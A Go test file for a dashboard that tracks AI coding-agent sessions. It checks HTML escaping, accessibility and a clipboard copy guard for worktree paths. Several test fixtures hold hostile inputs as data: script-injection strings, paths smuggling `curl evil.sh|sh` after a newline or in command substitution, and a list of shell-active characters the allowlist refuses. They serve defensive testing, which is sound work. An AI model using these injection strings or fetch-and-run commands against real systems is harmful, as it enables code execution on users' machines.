package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode"
)

func TestRowClass(t *testing.T) {
	// rowClass assembles the roster <tr> class list from three independent flags;
	// pin every combination so a template/CSS rename can't silently drift from it.
	cases := []struct {
		name              string
		rank              int
		groupStart, group bool
		want              string
	}{
		{"plain", 5, false, false, ""},
		// Zero-value Agent: StatusRank 0 is the most severe rank (<= 1), so a
		// default-initialised row reads as alert. Pins the rank-0 boundary in case a
		// future by-value Agent{} ever reaches rowClass.
		{"zero value (rank 0)", 0, false, false, "alert"},
		{"alert only", 1, false, false, "alert"},
		{"group-start only", 5, true, false, "group-start"},
		{"grouped only", 5, false, true, "grouped"},
		{"alert+grouped", 0, false, true, "alert grouped"},
		{"group-start+grouped", 5, true, true, "group-start grouped"},
		{"all three", 1, true, true, "alert group-start grouped"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := rowClass(Agent{StatusRank: c.rank, GroupStart: c.groupStart, Grouped: c.group})
			if got != c.want {
				t.Errorf("rowClass(rank=%d groupStart=%v grouped=%v) = %q, want %q", c.rank, c.groupStart, c.group, got, c.want)
			}
		})
	}
}

func TestHandleDashboard_RendersAndFilters(t *testing.T) {
	db, err := openDB(filepath.Join(t.TempDir(), "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "other", EventType: "SessionStart", Summary: "SessionStart", PayloadJSON: "{}"})

	// No filter: both source apps present. Recent events is a debug-gated section.
	body := getBody(t, db, "/?debug=1")
	if !strings.Contains(body, "Bash: git status") || !strings.Contains(body, "SessionStart") {
		t.Errorf("dashboard missing events:\n%s", body)
	}

	// Filter by source_app.
	body = getBody(t, db, "/?source_app=other&debug=1")
	if strings.Contains(body, "Bash: git status") {
		t.Errorf("source filter leaked myapp event:\n%s", body)
	}
	if !strings.Contains(body, "SessionStart") {
		t.Errorf("source filter dropped matching event:\n%s", body)
	}
}

func TestHandleDashboard_EscapesHTML(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: `<script>alert(1)</script>`, PayloadJSON: "{}"})

	// The summary is rendered in the debug-gated Recent-events section.
	body := getBody(t, db, "/?debug=1")
	if strings.Contains(body, "<script>alert(1)</script>") {
		t.Errorf("summary was not HTML-escaped:\n%s", body)
	}
	if !strings.Contains(body, "&lt;script&gt;") {
		t.Errorf("expected escaped summary in output:\n%s", body)
	}
}

// The roster's branch cell is a click-to-copy control for the session's worktree
// path. These pin the three states that matter: a live session with a cwd, one
// without, and the escaping of a hostile path.
func TestHandleDashboard_RosterBranchCopiesCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-copy", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "1 live") {
		t.Fatalf("expected a roster row to render (nothing to assert on otherwise):\n%s", body)
	}
	if !strings.Contains(body, `class="copycwd"`) {
		t.Errorf("roster branch cell has no copy button:\n%s", body)
	}
	if !strings.Contains(body, `data-cwd="/home/me/wt/fix-71"`) {
		t.Errorf("copy button does not carry the session cwd:\n%s", body)
	}
}

func TestHandleDashboard_RosterBranchWithoutCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-nocwd", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "1 live") {
		t.Fatalf("expected a roster row to render:\n%s", body)
	}
	// The bare class name also appears in the page's CSS and JS, so match the
	// rendered attribute.
	if strings.Contains(body, `class="copycwd"`) {
		t.Errorf("cwd-less row must not offer a copy button:\n%s", body)
	}
	if !strings.Contains(body, "fix-71") {
		t.Errorf("branch name dropped along with the button:\n%s", body)
	}
}

// The cwd reaches three separate attributes, so each is asserted on its own: a
// whole-body scan would still pass if data-cwd escaped and title did not.
func TestHandleDashboard_EscapesCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: `/tmp/"><script>alert(1)</script>`,
		SessionID: "sess-xss", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `class="copycwd"`) {
		t.Fatalf("expected the copy button to render:\n%s", body)
	}
	if strings.Contains(body, "<script>alert(1)</script>") {
		t.Errorf("cwd was not HTML-escaped:\n%s", body)
	}
	// Scope to the button's own tag: title and aria-label appear elsewhere on the
	// page, and a whole-body search would happily match one of those instead.
	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
	if tag == "" {
		t.Fatalf("could not isolate the copy button tag:\n%s", body)
	}
	// Each attribute must have closed at its own quote, with the cwd's own quote
	// and angle brackets escaped inside it — that is what proves the value could
	// not break out of that specific attribute.
	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
		if m == nil {
			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
			continue
		}
		if !strings.Contains(m[1], "&lt;script&gt;") {
			t.Errorf("%s = %q, want the cwd's angle brackets escaped", attr, m[1])
		}
		if !strings.Contains(m[1], "&#34;") {
			t.Errorf("%s = %q, want the cwd's double quote escaped", attr, m[1])
		}
	}
}

// The button carries the accessibility contract for the copy affordance: a name
// of its own (it replaces its inner text for assistive tech), a decorative glyph
// hidden from it, and a live region to announce into.
func TestHandleDashboard_CopyButtonAccessibility(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-a11y", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `aria-label="fix-71 — copy worktree path /home/me/wt/fix-71"`) {
		t.Errorf("copy button is missing its accessible name:\n%s", body)
	}
	if !strings.Contains(body, `<span class="copyicon" aria-hidden="true">`) {
		t.Errorf("the ⧉ glyph must be hidden from assistive tech:\n%s", body)
	}
	if !strings.Contains(body, `id="ck-copystatus" class="ck-sr" role="status"`) {
		t.Errorf("copy live region missing:\n%s", body)
	}
	// The path is on hover too — issue #71 asks for it explicitly.
	if !strings.Contains(body, `title="/home/me/wt/fix-71"`) {
		t.Errorf("copy button lost the hover title:\n%s", body)
	}
}

// The ⧉ is transparent at rest, which makes the rules that bring it BACK
// load-bearing rather than cosmetic. A keyboard copy never hovers, and a mouse
// copy is routinely followed by the pointer leaving the row well inside the
// 1.2s flash window — so if either flash class stops outranking the resting
// opacity, the ✓/✗ confirmation goes silent for sighted users while every other
// test here (which only asserts the glyph's markup and its colour classes) keeps
// passing. Touch is the mirror case: with no hover to reveal on, the glyph is
// the only thing marking the cell as a control, so it must stay visible there.
func TestDashboardCopyIcon_TransparentAtRestButForcedBackWhenItMatters(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")

	if !regexp.MustCompile(`\.copyicon\s*\{[^}]*\bopacity:\s*0\b`).MatchString(body) {
		t.Error(".copyicon lost its resting opacity: 0 — the glyph is back on every roster row")
	}

	var reveal string
	for _, m := range regexp.MustCompile(`([^{}]*)\{\s*opacity:\s*1;\s*\}`).FindAllStringSubmatch(body, -1) {
		reveal += m[1]
	}
	for _, sel := range []string{
		"tr:hover .copyicon",               // pointer discoverability
		".copycwd:focus-visible .copyicon", // keyboard discoverability
		".copycwd.copied .copyicon",        // success confirmation
		".copycwd.copyfail .copyicon",      // refused/failed copy
	} {
		if !strings.Contains(reveal, sel) {
			t.Errorf("%q no longer forces the glyph visible; reveal selectors are: %q", sel, reveal)
		}
	}

	if !regexp.MustCompile(`@media \(hover: none\)\s*\{\s*\.copyicon\s*\{[^}]*\bopacity:\s*1\b`).MatchString(body) {
		t.Error("touch devices have no hover to reveal on; .copyicon must stay visible under @media (hover: none)")
	}
}

// On a grouped row that HAS a copy button, "(cluster)" must live in the button's
// own aria-label. A button's aria-label replaces its accessible name outright, so
// a sibling span carrying the note is silent to anyone tabbing control-to-control
// — and emitting both would make browse mode say it twice. Exactly one carrier.
func TestHandleDashboard_ClusterSuffixComposesWithCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	// Two live sessions on one (source_app, branch) make a cluster.
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-c1", EventType: "Stop", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-c2", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "2 live") {
		t.Fatalf("expected two roster rows to form a cluster:\n%s", body)
	}
	// The button's OWN accessible name, parallel to how (mid-rebase) is folded in.
	want := `aria-label="fix-71 (cluster) — copy worktree path /home/me/wt/fix-71"`
	if n := strings.Count(body, want); n != 2 {
		t.Errorf("expected both grouped rows' buttons to be named %s, got %d, in:\n%s", want, n, body)
	}
	// ...and not ALSO in a sibling span, which would double the announcement.
	if strings.Contains(body, `<span class="ck-sr"> (cluster)</span>`) {
		t.Errorf("grouped row with a copy button must not also emit the sibling span:\n%s", body)
	}
	// Never a name on the cell itself: that would replace the button, not compose.
	if strings.Contains(body, `<td class="branch" data-label="branch" aria-label`) {
		t.Errorf("cluster suffix must not be an aria-label on the cell:\n%s", body)
	}
	if !strings.Contains(body, `class="copycwd"`) {
		t.Errorf("grouped row lost its copy button:\n%s", body)
	}
	// The poller carries keyboard focus across its #content swap by matching the
	// button's data-session, so a cluster — two sessions, one identical cwd — is
	// exactly where a data-cwd key would land focus on the wrong row. The two
	// buttons must therefore carry DISTINCT session keys, and row order inside a
	// cluster is not stable between polls, so this is the only thing that keeps
	// focus on the row the user was actually on.
	keys := regexp.MustCompile(`data-session="([^"]*)"`).FindAllStringSubmatch(body, -1)
	if len(keys) != 2 {
		t.Fatalf("expected both clustered buttons to carry data-session, got %d, in:\n%s", len(keys), body)
	}
	if keys[0][1] == keys[1][1] || keys[0][1] == "" {
		t.Errorf("clustered rows must carry distinct non-empty session keys, got %q and %q",
			keys[0][1], keys[1][1])
	}
}

// The mirror image: a grouped row with NO cwd has no button to carry the note, so
// the visually-hidden sibling span stays its carrier. Both halves of the rule
// have to hold, or one of them silently becomes the only case that works.
func TestHandleDashboard_ClusterSuffixWithoutCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-n1", EventType: "Stop", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-n2", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if strings.Contains(body, `class="copycwd"`) {
		t.Fatalf("cwd-less rows must not render a copy button:\n%s", body)
	}
	if n := strings.Count(body, `<span class="ck-sr"> (cluster)</span>`); n != 2 {
		t.Errorf("expected 2 sibling cluster spans on the button-less rows, got %d, in:\n%s", n, body)
	}
}

// Mid-rebase state reaches the button's own name, since that name replaces the
// 🚧 glyph's label for anyone who tabs to the control.
func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Rebasing: true, Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-rebase", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `aria-label="fix-71 (mid-rebase) — copy worktree path /home/me/wt/fix-71"`) {
		t.Errorf("mid-rebase state missing from the button label:\n%s", body)
	}
}

// Control characters must never reach the copy target: html/template does not
// escape a newline in an attribute value, so one would ride the clipboard into a
// terminal as a command terminator. buildEvent strips them on the way in, which
// is what this exercises end to end.
//
// Only the control characters are stripped — the pipe survives into the
// attribute, deliberately, because | is legal in a directory name and removing
// it would corrupt a real path. Nothing shell-active is ever copied all the
// same: the client's allowlist refuses the whole value (see
// TestDashboardCopyGuard_PathAllowlist, which pins this exact string).
func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	raw := []byte(`{"session_id":"sess-ctrl","hook_event_name":"Stop","cwd":"/home/me/wt\ncurl evil.sh|sh\u0007\t"}`)
	if err := insertEvent(db, buildEvent(raw, "myapp")); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	if got, want := m[1], "/home/me/wtcurl evil.sh|sh"; got != want {
		t.Errorf("data-cwd = %q, want %q", got, want)
	}
	if strings.ContainsFunc(m[1], unicode.IsControl) {
		t.Errorf("control character survived into data-cwd: %q", m[1])
	}
}

// Rows written before ingest started stripping control characters are still in
// the database, so the read path strips too. Inserting the Event DIRECTLY —
// bypassing buildEvent — is the point: it is the only way to produce the legacy
// shape, and the only thing that distinguishes this from the test above. All
// three attributes the cwd reaches are checked, not just the copy target: the
// client's copy guard defends the clipboard alone, so title and aria-label have
// no second line of defence.
func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		Cwd:       "/home/me/wt\ncurl evil.sh|sh\x07\t",
		SessionID: "sess-legacy", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
	if tag == "" {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
		if m == nil {
			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
			continue
		}
		if strings.ContainsFunc(m[1], unicode.IsControl) {
			t.Errorf("control character survived into %s: %q", attr, m[1])
		}
		if !strings.Contains(m[1], "/home/me/wtcurl evil.sh|sh") {
			t.Errorf("%s = %q, want the cwd with only its control characters removed", attr, m[1])
		}
	}
}

// The read path re-applies the length cap as well as the control-character
// strip. Both exist for the same rows — written before cwd had either — and an
// oversized one would otherwise be rendered three times per roster row on every
// render and every poll. Inserted directly, bypassing buildEvent, which is the
// only way to produce the legacy shape.
func TestHandleDashboard_LegacyOversizedCwdIsCappedOnRead(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	long := "/home/me/" + strings.Repeat("a", maxPathLen)
	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: long,
		SessionID: "sess-long", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	if n := len([]rune(m[1])); n != maxPathLen+1 { // +1 for the ellipsis truncate appends
		t.Errorf("data-cwd is %d runes, want the %d-rune cap plus an ellipsis", n, maxPathLen)
	}
	// ...and the ellipsis is what makes the client's 'truncated' refusal fire.
	if !strings.HasSuffix(m[1], "…") {
		t.Errorf("capped cwd should end in an ellipsis, got %q", m[1][len(m[1])-8:])
	}
}

// The scrub layer fails closed, so a real path segment shaped like a credential
// comes back as «redacted» and the stored cwd is no longer a path. The server
// still renders the row — the branch, the status, the hover title are all worth
// showing — but the client must refuse to put that value on the clipboard rather
// than hand over a directory that does not exist. This pins both halves the
// server can see: the redacted value reaching the button, and the guard being
// present in the script that reads it.
func TestHandleDashboard_RedactedCwdIsRefusedByTheCopyGuard(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	raw := []byte(`{"session_id":"sess-red","hook_event_name":"Stop","cwd":"/home/me/wt/api-key=v1/fix-71"}`)
	ev := buildEvent(raw, "myapp")
	ev.TS = ts
	if !strings.Contains(ev.Cwd, redacted) {
		t.Fatalf("expected the scrub layer to redact this path shape, got %q", ev.Cwd)
	}
	if err := insertEvent(db, ev); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	if !strings.Contains(body, redacted) {
		t.Errorf("the redacted cwd should still render (the row is worth showing):\n%s", body)
	}
	// The refusal itself lives in the client, so what the server can assert is
	// that the guard is shipped and wired into the click handler. All three
	// branches are pinned, not just the one this row exercises: a simplification
	// that dropped the ellipsis disjunct would let a truncated path be copied as
	// a broken path with the suite still green. So are the three messages —
	// their whole point is that each cause is described accurately.
	for _, frag := range []string{
		`function unusableReason(s) {`,
		`if (s.indexOf('` + redacted + `') !== -1) return 'redacted';`,
		`if (s.charAt(s.length - 1) === '…') return 'truncated';`,
		`if (pathAllow.test(s)) return 'unsafe';`,
		`var path = btn.getAttribute('data-cwd') || '';`,
		`var why = ctrlChars.test(path) ? 'unsafe' : unusableReason(path);`,
		`flash(btn, false, unusableMsg[why]);`,
		`redacted: 'part of this path was redacted — not copied',`,
		`truncated: 'this path was too long and got cut off — not copied',`,
		`unsafe: 'this path contains shell characters — not copied'`,
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("copy guard fragment missing from the page: %s", frag)
		}
	}
}

// pathAllowJS is the copy guard's allowlist exactly as it appears inside
// new RegExp('…') in dashboard.html, and pathAllowGo is the same pattern with
// the JS string escaping undone. Go's regexp gives \p{L}/\p{M}/\p{N} the same
// meaning JS does under /u, so compiling it here exercises the real character
// class. Asserting the JS form is present in the page keeps the two in step: a
// change to the template that this test does not follow fails it.
const pathAllowJS = `[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]`

var pathAllowGo = regexp.MustCompile(strings.ReplaceAll(pathAllowJS, `\\`, `\`))

// The same, for the ES5 fallback the guard installs on an engine without
// Unicode property escapes. It is pinned because it is the pattern those older
// engines actually run: widening this class to quiet a false positive would
// break the refusal on exactly the engines the fallback exists for, and nothing
// else in the suite would notice. Only the \uXXXX escapes need translating.
const pathAllowFallbackJS = `[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]`

var pathAllowFallbackGo = regexp.MustCompile(strings.NewReplacer(
	`\\u0080`, `\x{0080}`, `\\uFFFF`, `\x{FFFF}`).Replace(pathAllowFallbackJS))

// The allowlist has to refuse everything a shell would act on, and it has to
// stay out of the way of ordinary paths. The second half matters as much as the
// first: refusing spaces or non-ASCII names would make the button useless on a
// Mac or on anyone's non-English filesystem, which is a worse outcome than the
// attack it defends against.
func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
	safe := []string{
		"/home/me/wt/fix-71",
		"/Users/me/Library/Application Support/Claude",      // spaces are ordinary
		"/home/mé/Ünïcode/プロジェクト/仕事",                        // non-ASCII letters must copy
		"/home/me/Δοκιμή/проект/מסמכים",                     // more scripts, incl. RTL
		"/home/me/v1.2+build=3,rev:4@host~tmp/100%_done-ok", // every permitted punctuation mark
		"/",
	}
	// Both patterns, always: the fallback is what pre-2018 engines run, and a
	// divergence between the two is a hole that only opens on those engines.
	pats := map[string]*regexp.Regexp{
		"unicode property escapes": pathAllowGo,
		"ES5 fallback":             pathAllowFallbackGo,
	}
	for which, re := range pats {
		for _, p := range safe {
			if re.MatchString(p) {
				t.Errorf("%s allowlist refuses an ordinary path: %q (offending char %q)",
					which, p, re.FindString(p))
			}
		}
	}

	unsafe := map[string]string{
		"command substitution": "/home/me/proj$(curl -s evil.sh|sh)",
		"backtick":             "/home/me/proj`id`",
		"semicolon":            "/home/me/proj;id",
		"pipe":                 "/home/me/wtcurl evil.sh|sh",
		"ampersand":            "/home/me/proj&id",
		"redirect out":         "/home/me/proj>out",
		"redirect in":          "/home/me/proj<in",
		"double quote":         `/home/me/pro"j`,
		"single quote":         "/home/me/pro'j",
		"backslash":            `/home/me/pro\j`,
		"glob star":            "/home/me/proj*",
		"glob question":        "/home/me/proj?",
		"bracket":              "/home/me/pro[j]",
		"brace":                "/home/me/pro{j}",
		"history bang":         "/home/me/proj!",
		"comment hash":         "/home/me/proj#x",
		"newline":              "/home/me/proj\nid",
	}
	for which, re := range pats {
		for name, p := range unsafe {
			if !re.MatchString(p) {
				t.Errorf("%s allowlist permits a shell-active path (%s): %q", which, name, p)
			}
		}
	}
}

// The pattern the test above exercises must be the one the page actually ships.
func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")
	if !strings.Contains(body, `new RegExp('`+pathAllowJS+`', 'u')`) {
		t.Errorf("the page does not ship the allowlist this suite tests: %s", pathAllowJS)
	}
	if !strings.Contains(body, `new RegExp('`+pathAllowFallbackJS+`')`) {
		t.Errorf("the page does not ship the fallback allowlist this suite tests: %s", pathAllowFallbackJS)
	}
}

// Two ways the copy button can fail a keyboard user, both of which cost nothing
// to keep pinned. The drag-selection guard must not run on keyboard activation
// (Enter does not collapse a selection made earlier elsewhere, so a
// document-wide guard would swallow the copy with no flash and no
// announcement), and the poller must carry focus across its #content swap
// rather than drop it to <body> mid-interaction. The refocus key is the session
// id (a cluster shares one cwd, so a path key would restore to the wrong row)
// and the focus call must pass preventScroll (rows move between polls, and
// refocusing must not yank a viewport the user did not scroll).
func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")
	for _, frag := range []string{
		`if (ev.detail !== 0) {`,
		`sel.containsNode(btn, true)`,
		`function swapContent(html) {`,
		`active.closest('#content .copycwd')`,
		`var key = keep ? keep.getAttribute('data-session') : null;`,
		`if (btns[i].getAttribute('data-session') === key) { btns[i].focus({ preventScroll: true }); return; }`,
		`document.dispatchEvent(new CustomEvent('ch:contentswap'))`,
		`document.addEventListener('ch:contentswap', unflash);`,
		`swapContent(d.html);`,
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("copy-button a11y fragment missing from the page: %s", frag)
		}
	}
}

// The copy affordance is roster-only by design: the activity and recent-events
// branch cells share branchcell, which must stay a plain <td>. A session-less
// event lands in both of those tables but never on the roster.
func TestHandleDashboard_NonRosterBranchCellsHaveNoCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})

	body := getBody(t, db, "/?debug=1")
	if !strings.Contains(body, "0 live") {
		t.Fatalf("session-less event should not reach the roster:\n%s", body)
	}
	if !strings.Contains(body, "Activity (last 30 min)") || !strings.Contains(body, "Bash: git status") {
		t.Fatalf("expected the activity and recent-events tables to render:\n%s", body)
	}
	if strings.Contains(body, `class="copycwd"`) {
		t.Errorf("copy button leaked outside the roster:\n%s", body)
	}
}

func TestHandleDashboard_RendersActivity(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-2499", EventType: "PreToolUse", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-2499", EventType: "Stop", PayloadJSON: "{}"})

	// The Activity section is a diagnostics section, gated behind ?debug=1.
	body := getBody(t, db, "/?debug=1")
	if !strings.Contains(body, "Activity (last 30 min)") {
		t.Errorf("activity section missing:\n%s", body)
	}
}

func TestBuildDashboardData_DebugFlag(t *testing.T) {
	db, err := openDB(filepath.Join(t.TempDir(), "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	mk := func(target string) dashboardData {
		r := httptest.NewRequest(http.MethodGet, target, nil)
		d, err := buildDashboardData(r, db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
		if err != nil {
			t.Fatal(err)
		}
		return d
	}
	if mk("/").Debug {
		t.Error("Debug should be false without ?debug=1")
	}
	if mk("/?debug=0").Debug {
		t.Error("Debug should be false for ?debug=0")
	}
	if !mk("/?debug=1").Debug {
		t.Error("Debug should be true for ?debug=1")
	}
}

// The two diagnostics sections render only when Debug is set; the roster is the
// whole page by default.
func TestHandleDashboard_DiagnosticsGatedOnDebug(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "b", EventType: "PreToolUse", ToolName: "Bash", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "b", EventType: "Stop", PayloadJSON: "{}"})

	off := getBody(t, db, "/")
	if strings.Contains(off, "Activity (last 30 min)") || strings.Contains(off, "Recent events") {
		t.Errorf("diagnostics rendered with debug off:\n%s", off)
	}
	on := getBody(t, db, "/?debug=1")
	if !strings.Contains(on, "Activity (last 30 min)") || !strings.Contains(on, "Recent events") {
		t.Errorf("diagnostics missing with debug on:\n%s", on)
	}
}

func TestHandleState_ReturnsSignatureAndHTML(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})

	req := httptest.NewRequest(http.MethodGet, "/api/state?debug=1", nil)
	rec := httptest.NewRecorder()
	handleState(rec, req, db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	var resp struct {
		Signature string `json:"signature"`
		HTML      string `json:"html"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v\nbody: %s", err, rec.Body.String())
	}
	if resp.Signature == "" {
		t.Error("empty signature")
	}
	if !strings.Contains(resp.HTML, "Bash: git status") {
		t.Errorf("fragment missing event:\n%s", resp.HTML)
	}
	// The fragment is the dynamic region only — no surrounding page chrome.
	if strings.Contains(resp.HTML, "<form") || strings.Contains(resp.HTML, "<script") {
		t.Errorf("fragment leaked page chrome:\n%s", resp.HTML)
	}
	// The copy live region must stay OUTSIDE #content, which this fragment
	// replaces wholesale. A re-created live region is a NEW region to assistive
	// tech and its text is not announced — a silent, invisible regression.
	if strings.Contains(resp.HTML, "ck-copystatus") {
		t.Errorf("copy live region moved inside the swapped region:\n%s", resp.HTML)
	}
}

func TestBuildDashboardDataMergeFlags(t *testing.T) {
	db, err := openDB(filepath.Join(t.TempDir(), "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	ci := newCICache()
	peek := &peekConfig{}
	cfg := &actionConfig{enabled: true, token: "tok"}
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	data, err := buildDashboardData(r, db, ci, peek, cfg)
	if err != nil {
		t.Fatal(err)
	}
	if !data.MergeEnabled || data.CSRFToken != "tok" {
		t.Fatalf("MergeEnabled=%v CSRFToken=%q", data.MergeEnabled, data.CSRFToken)
	}
}

// Both routes carry the hardening headers. The framing one has teeth: the
// clipboard fallback used on a non-secure origin still copies inside a frame,
// so a framed dashboard is a usable decoy.
func TestHandlers_SetSecurityHeaders(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
